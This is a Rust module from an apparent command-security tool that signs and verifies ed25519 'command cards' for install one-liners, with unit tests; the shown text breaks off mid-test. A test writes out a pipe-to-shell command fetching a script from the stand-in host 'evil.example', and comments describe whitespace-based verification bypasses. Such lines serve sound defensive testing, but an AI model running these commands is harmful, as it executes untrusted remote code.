//! M11 ch1 — signed "command cards".
//!
//! An ed25519-signed attestation of what a command does: the exact command
//! string, expected domains, piped-script SHA-256, written paths, sudo need, and
//! an expiry. A maintainer publishes a card alongside their install one-liner; a
//! user verifies it against the command they are about to run.
//!
//! v1 is ATTESTATION-ONLY — no suppression. A verified card emits one Info
//! [`RuleId::CommandCardVerified`] and does NOT change any other finding's
//! action/severity; a `curl … | sh` with a valid card still warns/blocks. A
//! mismatched command emits [`RuleId::CommandCardMismatch`] (High). v1
//! verification checks ONLY the signature, expiry, and exact command string —
//! the other signed fields (`script_sha256`, `expected_domains`, `writes`,
//! `requires_sudo`) are recorded but NOT enforced (enforcing `script_sha256`
//! would need the script body, forbidden by no-network-on-`check`).
//!
//! Trust model (v1, manual key distribution): signatures verify against ed25519
//! pubkeys the operator trusted by dropping `<key_id>.pub` (raw/hex/base64) into
//! `~/.config/tirith/trusted-card-keys/`. `key_id` = first 16 hex of
//! `sha256(pubkey)`. An untrusted key is treated as unverified — never
//! `CommandCardVerified`. No automatic key fetch.
//!
//! No hot-path network: card content is read only from disk on `tirith check`
//! (via `--card <path>` or a `# tirith-card: <local-path>` comment). A
//! URL-shaped reference is never fetched during `check`; the user runs
//! `tirith command-card fetch <url>` first (the only remote-I/O path), caching
//! under `~/.cache/tirith/cards/<sha256>.json`.

use std::path::{Path, PathBuf};

use ed25519_dalek::{Signature, Signer, SigningKey, VerifyingKey};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Length of an ed25519 secret/private key in bytes.
pub const SECRET_KEY_LEN: usize = 32;
/// Length of an ed25519 public key in bytes.
pub const PUBLIC_KEY_LEN: usize = 32;
/// Length of an ed25519 signature in bytes.
pub const SIGNATURE_LEN: usize = 64;

/// Read cap for a trusted public-key file (`<key_id>.pub`). A real key is well
/// under 4 KiB; the cap only bounds a malicious/oversized file.
const TRUSTED_PUBKEY_READ_CAP: u64 = 4096;

/// `true` for the ASCII whitespace a shell treats as a TOKEN SEPARATOR (space,
/// tab, `\n`, `\r`). Deliberately NARROWER than [`char::is_ascii_whitespace`],
/// which also counts `\x0C` FORM FEED: trimming `\x0C`/`\x0B` when comparing
/// commands could equate strings a shell treats as DIFFERENT — a signed-card /
/// manifest verification bypass. Used by the command-equality comparisons so the
/// trim is exactly what a shell would itself ignore.
pub(crate) fn is_shell_significant_ws(c: char) -> bool {
    matches!(c, ' ' | '\t' | '\n' | '\r')
}

/// The signature algorithm a card is signed with. v1 supports ONLY ed25519.
///
/// A closed enum (not a free `String`) so any non-`"ed25519"` value (`"none"`,
/// `"ED25519"`, `"rsa"`) FAILS to deserialize, killing the algo-confusion attack
/// class at parse time. Serializes as the lowercase string `"ed25519"`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SignatureAlgo {
    /// Edwards-curve ed25519 (the only supported algorithm in v1).
    #[default]
    Ed25519,
}

impl std::fmt::Display for SignatureAlgo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SignatureAlgo::Ed25519 => write!(f, "ed25519"),
        }
    }
}

/// The signature block attached to a card.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CardSignature {
    /// Signature algorithm (only [`SignatureAlgo::Ed25519`] in v1).
    pub algo: SignatureAlgo,
    /// First 16 hex of `sha256(pubkey)` — which trusted key verifies this card.
    pub key_id: String,
    /// Lowercase-hex ed25519 signature over the canonical signing payload.
    pub value: String,
}

/// A command card: the unsigned attestation fields plus an optional signature.
/// The signature covers [`Card::signing_payload`] — every field except the
/// signature block.
///
/// `deny_unknown_fields`: a signed card is a security attestation, so an unknown
/// on-disk field must be rejected rather than silently dropped before
/// `signing_payload` re-serializes — otherwise it would ride outside the
/// attested boundary. (`#[serde(default)]` on optional fields still tolerates
/// MISSING ones.)
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Card {
    /// The exact command the card attests to.
    pub command: String,
    /// Domains (or `host/path` prefixes) the command is expected to contact.
    #[serde(default)]
    pub expected_domains: Vec<String>,
    /// SHA-256 (hex) of the piped script, if any. RECORDED-BUT-NOT-ENFORCED in
    /// v1: signed, but `tirith check` does NOT compare it against the script body
    /// (that would need network on the hot path). Maintainer intent, not a
    /// guarantee that a server-side script swap is caught.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script_sha256: Option<String>,
    /// Filesystem paths the command is expected to write.
    #[serde(default)]
    pub writes: Vec<String>,
    /// Whether the command legitimately requires sudo.
    #[serde(default)]
    pub requires_sudo: bool,
    /// Expiry date in `YYYY-MM-DD`. A card past this date does not verify.
    pub expires: String,
    /// The ed25519 signature block. `None` for a freshly-created, unsigned card.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signature: Option<CardSignature>,
}

/// Why a card failed to verify (used internally + surfaced as Info notes).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VerifyFailure {
    /// The card carries no signature block.
    Unsigned,
    /// The signature algorithm is not `ed25519`.
    UnsupportedAlgo(String),
    /// The signature or key_id field is malformed (bad hex / wrong length).
    MalformedSignature,
    /// No trusted public key matches the card's `key_id`.
    UntrustedKey,
    /// The ed25519 signature did not verify against the trusted key.
    BadSignature,
    /// The card's `expires` date is in the past.
    Expired,
    /// The `expires` field could not be parsed as `YYYY-MM-DD`.
    UnparseableExpiry,
}

impl VerifyFailure {
    /// A short, human-readable reason for the failure.
    pub fn reason(&self) -> String {
        match self {
            VerifyFailure::Unsigned => "card is not signed".to_string(),
            VerifyFailure::UnsupportedAlgo(a) => {
                format!("unsupported signature algorithm '{a}' (only ed25519)")
            }
            VerifyFailure::MalformedSignature => "card signature is malformed".to_string(),
            VerifyFailure::UntrustedKey => "card signature is from an untrusted key".to_string(),
            VerifyFailure::BadSignature => "card signature did not verify".to_string(),
            VerifyFailure::Expired => "card has expired".to_string(),
            VerifyFailure::UnparseableExpiry => "card has an unparseable expiry date".to_string(),
        }
    }
}

/// Errors from card I/O, signing, and parsing (CLI surface).
#[derive(Debug)]
pub enum CardError {
    /// Underlying I/O failure (read/write).
    Io(std::io::Error),
    /// JSON (de)serialization failure.
    Json(serde_json::Error),
    /// A key file was the wrong length or could not be decoded.
    BadKey(String),
    /// The card could not be signed/verified (e.g. unsupported algo).
    Crypto(String),
}

impl std::fmt::Display for CardError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CardError::Io(e) => write!(f, "{e}"),
            CardError::Json(e) => write!(f, "{e}"),
            CardError::BadKey(m) => write!(f, "{m}"),
            CardError::Crypto(m) => write!(f, "{m}"),
        }
    }
}

impl std::error::Error for CardError {}

impl From<std::io::Error> for CardError {
    fn from(e: std::io::Error) -> Self {
        CardError::Io(e)
    }
}

impl From<serde_json::Error> for CardError {
    fn from(e: serde_json::Error) -> Self {
        CardError::Json(e)
    }
}

/// Lowercase-hex encode a byte slice (no `hex` crate dependency in this crate).
pub fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(char::from_digit((b >> 4) as u32, 16).unwrap());
        s.push(char::from_digit((b & 0x0f) as u32, 16).unwrap());
    }
    s
}

/// Decode a lowercase/uppercase hex string into bytes. Returns `None` on any
/// non-hex char or odd length.
pub fn hex_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let hi = (bytes[i] as char).to_digit(16)?;
        let lo = (bytes[i + 1] as char).to_digit(16)?;
        out.push(((hi << 4) | lo) as u8);
        i += 2;
    }
    Some(out)
}

/// Compute the `key_id` for a public key: first 16 hex chars of
/// `sha256(pubkey_bytes)`.
pub fn key_id_for_pubkey(pubkey: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(pubkey);
    let digest = hasher.finalize();
    hex_encode(&digest)[..16].to_string()
}

/// SHA-256 (hex) of an arbitrary byte slice — used to name cached card files
/// and to compute a card's `script_sha256`.
pub fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex_encode(&hasher.finalize())
}

impl Card {
    /// Build a fresh, unsigned card from its attestation fields.
    pub fn new(
        command: String,
        expected_domains: Vec<String>,
        script_sha256: Option<String>,
        writes: Vec<String>,
        requires_sudo: bool,
        expires: String,
    ) -> Self {
        Card {
            command,
            expected_domains,
            script_sha256,
            writes,
            requires_sudo,
            expires,
            signature: None,
        }
    }

    /// The canonical bytes the signature covers: the card with `signature`
    /// cleared, as compact JSON. Both sign and verify use this exact form.
    pub fn signing_payload(&self) -> Result<Vec<u8>, CardError> {
        let mut unsigned = self.clone();
        unsigned.signature = None;
        Ok(serde_json::to_vec(&unsigned)?)
    }

    /// Parse a card from JSON bytes.
    pub fn from_json(bytes: &[u8]) -> Result<Self, CardError> {
        Ok(serde_json::from_slice(bytes)?)
    }

    /// Serialize the card as pretty JSON.
    pub fn to_json_pretty(&self) -> Result<String, CardError> {
        Ok(serde_json::to_string_pretty(self)?)
    }

    /// Sign with a 32-byte ed25519 secret key, stamping the `signature` block.
    pub fn sign(&mut self, secret_key: &[u8; SECRET_KEY_LEN]) -> Result<(), CardError> {
        let signing_key = SigningKey::from_bytes(secret_key);
        let verifying_key = signing_key.verifying_key();
        let key_id = key_id_for_pubkey(&verifying_key.to_bytes());

        let payload = self.signing_payload()?;
        let sig: Signature = signing_key.sign(&payload);

        self.signature = Some(CardSignature {
            algo: SignatureAlgo::Ed25519,
            key_id,
            value: hex_encode(&sig.to_bytes()),
        });
        Ok(())
    }

    /// Verify the signature against a known public key. `Ok(())` only when the
    /// signature is present, the algo is ed25519, the key_id matches `pubkey`,
    /// and the signature verifies. Does NOT check expiry — see
    /// [`Card::verify_against_trusted`].
    pub fn verify_signature(&self, pubkey: &[u8; PUBLIC_KEY_LEN]) -> Result<(), VerifyFailure> {
        let sig_block = self.signature.as_ref().ok_or(VerifyFailure::Unsigned)?;
        // Closed enum, so this match is total; the explicit arm forces a compile
        // error if a future variant skips its verification path.
        match sig_block.algo {
            SignatureAlgo::Ed25519 => {}
        }
        // The supplied key must be the one the card names.
        if key_id_for_pubkey(pubkey) != sig_block.key_id {
            return Err(VerifyFailure::UntrustedKey);
        }
        let sig_bytes = hex_decode(&sig_block.value).ok_or(VerifyFailure::MalformedSignature)?;
        if sig_bytes.len() != SIGNATURE_LEN {
            return Err(VerifyFailure::MalformedSignature);
        }
        let signature =
            Signature::from_slice(&sig_bytes).map_err(|_| VerifyFailure::MalformedSignature)?;
        let verifying_key =
            VerifyingKey::from_bytes(pubkey).map_err(|_| VerifyFailure::MalformedSignature)?;
        let payload = self
            .signing_payload()
            .map_err(|_| VerifyFailure::MalformedSignature)?;
        verifying_key
            .verify_strict(&payload, &signature)
            .map_err(|_| VerifyFailure::BadSignature)
    }

    /// True when `expires` is today or later (inclusive). Malformed expiry →
    /// `Err(UnparseableExpiry)`.
    pub fn not_expired(&self, today: chrono::NaiveDate) -> Result<bool, VerifyFailure> {
        let exp = chrono::NaiveDate::parse_from_str(self.expires.trim(), "%Y-%m-%d")
            .map_err(|_| VerifyFailure::UnparseableExpiry)?;
        Ok(today <= exp)
    }

    /// Full trust check: resolve `key_id` against the trusted-keys dir, verify
    /// the signature, and confirm the card has not expired.
    pub fn verify_against_trusted(
        &self,
        trusted_keys_dir: &Path,
        today: chrono::NaiveDate,
    ) -> Result<(), VerifyFailure> {
        let sig_block = self.signature.as_ref().ok_or(VerifyFailure::Unsigned)?;
        // Only need the key_id to resolve the trusted key; `verify_signature`
        // re-checks the algo.
        let pubkey = load_trusted_pubkey(trusted_keys_dir, &sig_block.key_id)
            .ok_or(VerifyFailure::UntrustedKey)?;
        self.verify_signature(&pubkey)?;
        if !self.not_expired(today)? {
            return Err(VerifyFailure::Expired);
        }
        Ok(())
    }

    /// The mismatch gate: does `command` match `cmd` byte-for-byte after trimming
    /// only shell-significant whitespace (see [`is_shell_significant_ws`])? NOT
    /// `str::trim` and NOT `char::is_ascii_whitespace` (which counts `\x0C`): a
    /// command differing only by U+00A0 or a trailing form feed MUST mismatch —
    /// equating chars a shell would not ignore is a verification bypass.
    pub fn command_matches(&self, cmd: &str) -> bool {
        self.command.trim_matches(is_shell_significant_ws)
            == cmd.trim_matches(is_shell_significant_ws)
    }
}

/// Load a trusted 32-byte public key for `key_id` from `dir/<key_id>.pub`. The
/// file may be 32 raw bytes, hex, or base64; the decoded key's own key_id must
/// equal `key_id` (a mislabeled file cannot impersonate another key). `None` if
/// absent or undecodable.
pub fn load_trusted_pubkey(dir: &Path, key_id: &str) -> Option<[u8; PUBLIC_KEY_LEN]> {
    // Guard against path traversal via a crafted key_id from a card.
    if key_id.is_empty() || !key_id.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    let path = dir.join(format!("{key_id}.pub"));
    // Hardened read: `read_regular_capped` O_NONBLOCK-opens + fstats so a
    // FIFO/device cannot block and an oversized `.pub` cannot exhaust memory.
    // Any open/read failure → `None`.
    let raw = crate::util::read_regular_capped(&path, TRUSTED_PUBKEY_READ_CAP).ok()?;
    let key = decode_pubkey_bytes(&raw)?;
    // Defense in depth: the content must be the key it claims.
    if key_id_for_pubkey(&key) != key_id {
        return None;
    }
    Some(key)
}

/// Decode public-key file contents into 32 raw bytes (raw / hex / base64).
fn decode_pubkey_bytes(raw: &[u8]) -> Option<[u8; PUBLIC_KEY_LEN]> {
    // Raw 32 bytes.
    if raw.len() == PUBLIC_KEY_LEN {
        let mut k = [0u8; PUBLIC_KEY_LEN];
        k.copy_from_slice(raw);
        return Some(k);
    }
    let text = std::str::from_utf8(raw).ok()?.trim();
    // Hex (64 chars).
    if let Some(decoded) = hex_decode(text) {
        if decoded.len() == PUBLIC_KEY_LEN {
            let mut k = [0u8; PUBLIC_KEY_LEN];
            k.copy_from_slice(&decoded);
            return Some(k);
        }
    }
    // Base64.
    use base64::Engine;
    if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(text) {
        if decoded.len() == PUBLIC_KEY_LEN {
            let mut k = [0u8; PUBLIC_KEY_LEN];
            k.copy_from_slice(&decoded);
            return Some(k);
        }
    }
    None
}

/// The directory where operators drop trusted card public keys:
/// `~/.config/tirith/trusted-card-keys/`.
pub fn trusted_card_keys_dir() -> Option<PathBuf> {
    crate::policy::config_dir().map(|d| d.join("trusted-card-keys"))
}

/// The directory where `tirith command-card fetch` caches downloaded cards:
/// `~/.cache/tirith/cards/`.
pub fn cards_cache_dir() -> Option<PathBuf> {
    let base = etcetera::choose_base_strategy().ok()?;
    use etcetera::BaseStrategy;
    Some(base.cache_dir().join("tirith").join("cards"))
}

/// The result of evaluating a card reference on the hot path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CardOutcome {
    /// Card verified (trusted key, good signature, not expired) AND its
    /// command matches the analyzed command. Emits `CommandCardVerified`.
    Verified,
    /// Card verified but its command does NOT match the analyzed command.
    /// Emits `CommandCardMismatch` (High).
    Mismatch,
    /// The card could not be verified (untrusted key / bad sig / expired /
    /// unsigned). Carries the reason for an Info `CommandCardUnverified` note
    /// (NEVER `CommandCardVerified`).
    Unverified(VerifyFailure),
}

/// Reference to a card discovered on the hot path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CardRef {
    /// A local path (sidecar `--card` flag or `# tirith-card: ./x.json`).
    LocalPath(String),
    /// A URL-shaped reference in a `# tirith-card:` comment. v1 does NOT fetch
    /// these on the hot path — it surfaces a "fetch first" warning instead.
    RemoteUrl(String),
}

/// Scan for a leading `# tirith-card: <ref>` comment, returning the first ref.
/// `http://`/`https://` → [`CardRef::RemoteUrl`] (never fetched on the hot path);
/// anything else → [`CardRef::LocalPath`].
///
/// SCOPE: only the LEADING prelude. Scanning stops at the first non-empty
/// non-marker line (the command start), so a `# tirith-card:` inside a heredoc
/// body is command content, not transport metadata — counting it would skew the
/// manifest match and spuriously trip [`CardOutcome::Mismatch`]. Whitespace after
/// the `#` is flexible to match the tier-1 `#\s*tirith-card:` regex, so
/// `#tirith-card:` / `#  tirith-card:` are not silently dropped after passing
/// tier-1.
pub fn find_card_comment(input: &str) -> Option<CardRef> {
    for line in input.lines() {
        match card_comment_value(line) {
            Some(rest) => {
                // Trim on the same shell-significant set as the marker detection
                // (never `\x0C`/`\x0B`/Unicode).
                let value = rest.trim_matches(is_shell_significant_ws);
                if value.is_empty() {
                    // Bare `# tirith-card:` with no ref: keep scanning.
                    continue;
                }
                return Some(classify_card_ref(value));
            }
            None => {
                // Blank prelude lines continue; a non-blank non-marker line is
                // the command start. Shell-significant blankness only.
                if is_blank_prelude_line(line) {
                    continue;
                }
                return None;
            }
        }
    }
    None
}

/// If `line` is a `# tirith-card: <ref>` marker (flexible whitespace after `#`,
/// matching tier-1 `#\s*tirith-card:`), return the trailing ref (un-trimmed);
/// else `None`. Shared by [`find_card_comment`] and [`strip_card_comment_lines`].
///
/// Trims SHELL-SIGNIFICANT whitespace only (space, tab, `\n`, `\r`) — never
/// `\x0C`/`\x0B`/Unicode. This keeps the marker/prelude parsers in EXACT lockstep
/// with the [`Card::command_matches`] gate: stripping a line the gate would not
/// trim equal (e.g. `\x0C`-padded) could mutate a signed command.
fn card_comment_value(line: &str) -> Option<&str> {
    let after_hash = line
        .trim_start_matches(is_shell_significant_ws)
        .strip_prefix('#')?;
    after_hash
        .trim_start_matches(is_shell_significant_ws)
        .strip_prefix("tirith-card:")
}

/// `true` when `line` is empty or only SHELL-SIGNIFICANT whitespace (space, tab,
/// `\n`, `\r`). Restricted to that set for lockstep with [`card_comment_value`]
/// and the [`Card::command_matches`] gate: a pure-Unicode-whitespace or
/// `\x0C`-containing line is NOT blank — it ends the prelude (counting it blank
/// could walk the scan past content the command compare keeps).
fn is_blank_prelude_line(line: &str) -> bool {
    line.bytes()
        .all(|b| matches!(b, b' ' | b'\t' | b'\n' | b'\r'))
}

/// Classify a card reference value as a local path or a remote URL.
pub fn classify_card_ref(value: &str) -> CardRef {
    let lower = value.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        CardRef::RemoteUrl(value.to_string())
    } else {
        CardRef::LocalPath(value.to_string())
    }
}

/// Remove the leading `# tirith-card:` prelude from `input`, returning the
/// attested command text. The marker is transport metadata, never part of the
/// signed command, so it MUST be stripped before the byte-for-byte
/// [`Card::command_matches`] compare — else a comment-carried command would
/// always falsely mismatch its own card.
///
/// Matches the same flexible-whitespace marker shape as [`find_card_comment`].
/// LINE ENDINGS ARE PRESERVED BYTE-FOR-BYTE (the body is `&input[offset..]`, not
/// split-and-rejoined), so a CRLF-authored command still compares equal instead
/// of being normalized to `\n`. SCOPE mirrors [`find_card_comment`]: only the
/// leading prelude is stripped; an in-body `# tirith-card:` is preserved.
pub fn strip_card_comment_lines(input: &str) -> String {
    input[prelude_end_offset(input)..].to_string()
}

/// Byte offset at which the real command begins (end of the leading
/// `# tirith-card:` prelude). `0` when there is no leading prelude. Single source
/// of truth for "where does the prelude end" — both [`strip_card_comment_lines`]
/// and [`has_card_comment_prelude`] derive from this scan. Always a line (hence
/// `str`) boundary.
fn prelude_end_offset(input: &str) -> usize {
    let mut offset = 0usize;
    // Only strip a prelude that ACTUALLY contains a marker; leading blanks alone
    // are not a reason to mutate the command. Without this guard `"\n\necho hi"`
    // would drop the blanks and diverge from `strip_card_comment_lines_cow`.
    let mut marker_seen = false;
    // `split_inclusive('\n')` keeps each separator attached, so summing chunk
    // lengths walks real byte offsets and never drops a `\r`.
    for chunk in input.split_inclusive('\n') {
        let line = chunk.strip_suffix('\n').unwrap_or(chunk);
        let line = line.strip_suffix('\r').unwrap_or(line);
        if card_comment_value(line).is_some() {
            marker_seen = true;
            offset += chunk.len();
            continue;
        }
        if is_blank_prelude_line(line) {
            // Provisionally prelude; kept only if a marker appears (below).
            offset += chunk.len();
            continue;
        }
        // First non-empty non-marker line: the command starts here.
        break;
    }
    // No marker → nothing to strip (the blanks are part of the command).
    if marker_seen {
        offset
    } else {
        0
    }
}

/// `true` when `input`'s LEADING prelude has at least one `# tirith-card:`
/// marker (i.e. when [`strip_card_comment_lines`] would remove something).
/// Mirrors the prelude scope: scanning stops at the first non-empty non-marker
/// line. Cheap.
pub fn has_card_comment_prelude(input: &str) -> bool {
    for line in input.lines() {
        if card_comment_value(line).is_some() {
            return true;
        }
        if is_blank_prelude_line(line) {
            continue;
        }
        return false;
    }
    false
}

/// [`strip_card_comment_lines`] but ZERO-allocation when `input` has no leading
/// prelude (borrowed unchanged). When a marker is present the body is still
/// preserved byte-for-byte (`&input[offset..]`), so CRLF survives on both paths.
/// Used by the engine's EXEC path to avoid allocating on every card-less command.
pub fn strip_card_comment_lines_cow(input: &str) -> std::borrow::Cow<'_, str> {
    if has_card_comment_prelude(input) {
        std::borrow::Cow::Owned(strip_card_comment_lines(input))
    } else {
        std::borrow::Cow::Borrowed(input)
    }
}

/// Evaluate an already-loaded card against the analyzed command. Pure — callers
/// do the disk reads for the card and key files.
pub fn evaluate_card(
    card: &Card,
    cmd: &str,
    trusted_keys_dir: &Path,
    today: chrono::NaiveDate,
) -> CardOutcome {
    match card.verify_against_trusted(trusted_keys_dir, today) {
        Ok(()) => {
            if card.command_matches(cmd) {
                CardOutcome::Verified
            } else {
                CardOutcome::Mismatch
            }
        }
        Err(failure) => {
            // Any verify failure is Unverified. The mismatch case needs a
            // SUCCESSFUL verify and is handled in the Ok arm above.
            CardOutcome::Unverified(failure)
        }
    }
}

/// Build the [`Finding`]s for a card outcome (v1 attestation-only):
/// `Verified` → one Info `CommandCardVerified` (the ONLY rule claiming
/// verification); `Mismatch` → one High `CommandCardMismatch`; `Unverified` →
/// one Info `CommandCardUnverified` (NEVER tagged verified). `Unverified`
/// includes `Unsigned`: this helper runs only after a card ref was resolved+read,
/// so a supplied-but-unsigned card must stay visible (the card-LESS case returns
/// early in `check_command_card_hot` before reaching here). None of these change
/// any OTHER finding's action.
pub fn findings_for_outcome(outcome: &CardOutcome) -> Vec<Finding> {
    match outcome {
        CardOutcome::Verified => vec![Finding {
            rule_id: RuleId::CommandCardVerified,
            severity: Severity::Info,
            title: "Command verified against a signed command card".to_string(),
            description: "A trusted, unexpired command card signed this exact command. \
                          This improves audit confidence but does not change the verdict — \
                          other findings still apply."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: "card signature verified against a trusted key".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }],
        CardOutcome::Mismatch => vec![Finding {
            rule_id: RuleId::CommandCardMismatch,
            severity: Severity::High,
            title: "Command does not match its signed command card".to_string(),
            description: "A trusted command card was found, but the command being run differs \
                          from the command the card attests to. The command may have been \
                          tampered with after the card was published."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: "signed card command != analyzed command".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }],
        CardOutcome::Unverified(failure) => {
            // Every Unverified case (incl. `Unsigned`) emits the Info note: this
            // runs only after a card was supplied, so it must stay VISIBLE. The
            // card-LESS "stay silent" case is the engine's early return upstream.
            vec![Finding {
                rule_id: RuleId::CommandCardUnverified,
                severity: Severity::Info,
                title: "Command card present but not verified".to_string(),
                description: format!(
                    "A command card was supplied but could not be verified ({}). \
                     Treating the command as if no card were present.",
                    failure.reason()
                ),
                evidence: vec![Evidence::Text {
                    detail: failure.reason(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }]
        }
    }
}

/// Generate a fresh ed25519 keypair `(secret, public)` via the OS CSPRNG.
pub fn generate_keypair() -> Result<([u8; SECRET_KEY_LEN], [u8; PUBLIC_KEY_LEN]), CardError> {
    let mut secret = [0u8; SECRET_KEY_LEN];
    getrandom::fill(&mut secret).map_err(|e| CardError::Crypto(format!("RNG failure: {e}")))?;
    let signing_key = SigningKey::from_bytes(&secret);
    let public = signing_key.verifying_key().to_bytes();
    Ok((secret, public))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn today() -> chrono::NaiveDate {
        chrono::NaiveDate::from_ymd_opt(2026, 5, 28).unwrap()
    }

    fn sample_card() -> Card {
        Card::new(
            "curl -fsSL https://example.com/install.sh | sh".to_string(),
            vec!["example.com".to_string()],
            None,
            vec!["/usr/local/bin/example".to_string()],
            false,
            "2026-08-01".to_string(),
        )
    }

    /// Write `<key_id>.pub` (raw 32 bytes) into `dir`.
    fn write_trusted_key(dir: &Path, pubkey: &[u8; PUBLIC_KEY_LEN]) {
        let key_id = key_id_for_pubkey(pubkey);
        std::fs::write(dir.join(format!("{key_id}.pub")), pubkey).unwrap();
    }

    #[test]
    fn hex_roundtrip() {
        let bytes = [0x00u8, 0x0f, 0xa5, 0xff];
        let h = hex_encode(&bytes);
        assert_eq!(h, "000fa5ff");
        assert_eq!(hex_decode(&h).unwrap(), bytes);
    }

    #[test]
    fn key_id_is_16_hex_chars() {
        let (_, pubkey) = generate_keypair().unwrap();
        let id = key_id_for_pubkey(&pubkey);
        assert_eq!(id.len(), 16);
        assert!(id.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn sign_then_verify_roundtrips() {
        let (secret, pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        assert!(card.verify_signature(&pubkey).is_ok());
        assert_eq!(
            card.signature.as_ref().unwrap().key_id,
            key_id_for_pubkey(&pubkey)
        );
    }

    #[test]
    fn tampered_command_fails_signature() {
        let (secret, pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        // Mutate a signed field — signature must no longer verify.
        card.command = "curl -fsSL https://evil.example/x.sh | sh".to_string();
        assert_eq!(
            card.verify_signature(&pubkey),
            Err(VerifyFailure::BadSignature)
        );
    }

    /// The mismatch gate must trim ONLY shell-significant whitespace: a command
    /// differing solely by U+00A0 (vs an ASCII space) must NOT be equated —
    /// `str::trim` would, opening a signed-card verification bypass.
    #[test]
    fn command_matches_does_not_trim_unicode_whitespace() {
        let card = sample_card();
        // A U+00A0 swapped in for an ASCII space is a DIFFERENT command.
        let tampered = card.command.replacen(' ', "\u{00A0}", 1);
        assert_ne!(
            tampered, card.command,
            "sanity: the tampered string actually differs"
        );
        assert!(
            !card.command_matches(&tampered),
            "a command differing only by a Unicode (U+00A0) whitespace must NOT match the signed text"
        );

        // Surrounding shell-significant whitespace still trims equal.
        let padded = format!(" \t\r\n{}\n  ", card.command);
        assert!(
            card.command_matches(&padded),
            "surrounding shell-significant whitespace must still trim equal"
        );
        assert!(card.command_matches(&card.command));

        // A FORM FEED (`\x0C`) / vertical tab (`\x0B`) is NOT a shell separator,
        // so a command differing only by a trailing one must NOT match.
        let ff_padded = format!("{}\u{000C}", card.command);
        assert_ne!(ff_padded, card.command, "sanity: the FF actually differs");
        assert!(
            !card.command_matches(&ff_padded),
            "a trailing form feed (`\\x0C`) is not shell whitespace and must NOT trim away"
        );
        let vt_padded = format!("{}\u{000B}", card.command);
        assert!(
            !card.command_matches(&vt_padded),
            "a trailing vertical tab (`\\x0B`) is not shell whitespace and must NOT trim away"
        );
    }

    #[test]
    fn wrong_key_is_untrusted() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let (_other_secret, other_pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        assert_eq!(
            card.verify_signature(&other_pubkey),
            Err(VerifyFailure::UntrustedKey)
        );
    }

    #[test]
    fn verified_card_matching_command_is_verified() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Verified);

        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardVerified);
        assert_eq!(findings[0].severity, Severity::Info);
    }

    #[test]
    fn verified_card_mismatched_command_is_mismatch_high() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        // Tamper the command being run (NOT the card).
        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh --extra-evil",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Mismatch);

        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardMismatch);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn untrusted_key_does_not_emit_verified() {
        let dir = tempfile::tempdir().unwrap();
        // Intentionally do NOT write the pubkey into the trusted dir.
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(
            outcome,
            CardOutcome::Unverified(VerifyFailure::UntrustedKey)
        );

        let findings = findings_for_outcome(&outcome);
        // Info CommandCardUnverified, NOT CommandCardVerified (a failed verify
        // must never carry the "verified" rule_id).
        assert_eq!(findings.len(), 1);
